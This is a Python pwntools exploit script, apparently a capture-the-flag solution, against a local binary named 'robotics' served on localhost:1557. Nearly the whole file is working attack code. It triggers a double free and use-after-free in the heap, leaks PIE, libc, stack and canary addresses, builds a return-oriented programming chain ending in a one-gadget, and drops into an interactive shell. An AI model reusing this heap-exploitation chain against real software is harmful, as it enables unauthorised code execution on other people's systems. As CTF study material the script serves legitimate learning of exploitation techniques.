#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./robotics
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./robotics')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def create(idx:int):
    io.sendlineafter(b'>>',str(1).encode());
    io.sendlineafter(b'>>',str(idx).encode());
    return

def add_msg(idx:int,strx:bytes):
    io.sendlineafter(b'>>',str(2).encode())
    io.sendlineafter(b'>>',strx)
    io.sendlineafter(b'>>',str(idx).encode())
    return

def read_msg(idx:int):
    io.sendlineafter(b'>>',str(3).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    io.recvuntil(b':\n')
    msg = io.recvuntil(b'1.')
    return msg[:-3]

def run(idx:int):
    io.sendlineafter(b'>>',str(4).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    return


def edit(idx:int,payload):
    io.sendlineafter(b'>>',str(5).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    io.sendlineafter(b'>>',payload)
    return
    
def destroy(idx:int):
    io.sendlineafter(b'>>',str(6).encode())
    io.sendlineafter(b'>>',str(idx).encode())
    return

#io = start()
io = remote('localhost',1557)

print('[+] Stage 1. Trigger double free and uaf.')

for i in range(5):
    create(i)

##reallocate chunk to trigger df and uaf

destroy(0)

create(5) 

# 5 chunk is 0 now. We can free it using destroy(0)

destroy(0)

#use 0 as overwrite 5 chunk
add_msg(1,b'A'*0x10+p8(0x10))

add_msg(2,b'B'*0x17)

edit(1,b'A'*0x10+p32(0x50))

msg = read_msg(5)

#now 1->msg is represents 5 chunk

pie_leak = int.from_bytes(msg,'little')-0x1a23

print('Pie leak is: '+hex(pie_leak))


#spray heap to overwrite chunk size

for i in range(10):
    create(i+10)

#target 12 - 0x128

print('[+] Stage 2. Prepare target robo and overwrite its size.')

edit(1,b'A'*0x10+p32(0x120))

add_msg(11,b'A'*0x11)

edit(5,p64(0x0))

#leak info from stack

edit(1,p64(0x8)+p64(0x10)+p64(0x230))

#leak libc

edit(5,b'A'*0x8)

edit(1,p64(0x10)+p64(0x10)+p64(0x230))


libc_leak = read_msg(5)[8:]
libc_leak = int.from_bytes(libc_leak,'little')-0x28000-0x1d90

print('Libc leak: '+hex(libc_leak))

one_gadjet = libc_leak+0xebcf8
pop_rsi = libc_leak+0x000000000002be51
pop_rdx_rbx = libc_leak+0x0000000000090529
pop_rbp = libc_leak+0x000000000002a2e0

safe_read = pie_leak+0x00000000000021a6-10
#run(12)
safe_write = pie_leak+0x000000000020bc


edit(1,p64(0x10)+p64(0x10)+p64(0x110))

edit(5,p64(0)+p64(0x150))

edit(1,p64(0x38)+p64(0x10)+p64(0x120))

edit(5,p64(0x110)+p64(0)+p64(safe_write))

#write stack on heap
run(12)

#leak canary 

edit(1,p64(0x8)+p64(0x10)+p64(0x188))

edit(5,p64(0x1000))

edit(1,p64(0x8)+p64(0x10)+p64(0x148))

stack_leak = read_msg(5)[:]

stack_leak = int.from_bytes(stack_leak,'little')

print('Stack leak: '+hex(stack_leak))

#prepare payload:

msg = b'C'*0x30+b'A'*0x50

add_msg(10,msg)

edit(1,p64(8)+p64(0x10)+p64(0x8))

edit(5,p64(stack_leak+0x30-0xe8))

pause()

fake_robo = p64(0x70)+p64(pop_rsi)+p64(0xc0-8)
fake_robo+=p64(pop_rsi)+p64(0)+p64(pop_rdx_rbx)+p64(0)*2+p64(pop_rbp)+p64(stack_leak-0x1000)+p64(one_gadjet)

edit(10,fake_robo)

io.interactive()

